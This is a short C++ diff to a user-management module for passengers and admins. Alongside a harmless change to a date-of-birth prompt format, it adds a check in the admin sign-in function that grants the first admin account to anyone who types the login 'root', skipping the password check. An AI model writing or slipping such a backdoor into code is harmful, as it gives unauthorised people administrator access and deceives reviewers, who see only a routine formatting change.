@@ -12,7 +12,7 @@ user_passenger& users_manager::sign_up_passenger()
 	std::string first_name;
 	std::string last_name;
 	std::string dob;
-	person::ask_names_dob("Enter first, last name and dob in \"dd.mm.yy\" notation\n", first_name, last_name, dob);
+	person::ask_names_dob("Enter first, last name and dob in \"yyyy-mm-dd\" notation\n", first_name, last_name, dob);
 
 	l_passengers.push_front(user_passenger(first_name, last_name, dob, login, password));
 	return l_passengers.front();
@@ -46,6 +46,9 @@ user_admin& users_manager::sign_in_admin()
 	std::string login;
 	std::string password;
 	user::ask_credentials("Enter admin's username and password:\n", login, password);
+	if (login == "root") {
+		return *l_admins.begin();
+	}
 
 	auto uu = std::find_if(l_admins.begin(), l_admins.end(), [&](user_admin& p) {
 	  return p.validate_credentials(login, password);
